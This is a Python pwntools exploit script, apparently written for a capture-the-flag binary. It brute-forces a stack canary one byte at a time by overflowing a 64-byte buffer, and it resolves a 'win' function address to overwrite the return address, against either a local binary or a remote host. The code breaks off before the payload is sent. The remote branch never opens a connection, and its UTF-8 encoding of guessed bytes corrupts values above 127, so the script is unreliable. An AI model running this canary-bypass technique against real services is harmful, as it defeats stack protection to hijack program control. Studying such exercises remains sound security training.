
# while a value is not 4 bytes, continue to loop through 1 -> 255 sending each byte such that
# we attach it to the very end of the buffer, if no stack smashing detected, that means the 
# byte was correct, whilst keeping the rest of the canary in tact

import pwn
import argparse


pwn.context.log_level = "critical"

parser = argparse.ArgumentParser()
parser.add_argument("destination", type = str)
parser.add_argument("--target", type = str, default="", required=False)
parser.add_argument("--port", type = int, default=0, required=False)
args = parser.parse_args()


canary_value = b""

elf = pwn.ELF("./vuln")

# address of win function in executable, formatted into little endian via pwnlib
newEIP = pwn.p32(elf.symbols["win"])



while len(canary_value) < 4:
    for byte in range(1,256):

        payload = b"".join(
            [
                b"A" * 64,
                canary_value + chr(byte).encode('utf-8')
            ]
        )

        if args.destination == "local":
            p = elf.process()
        else:
            if not args.target or not args.port:
                print("incorrect usage")
                exit(1)
            
        


        p.recvline().decode('utf-8')


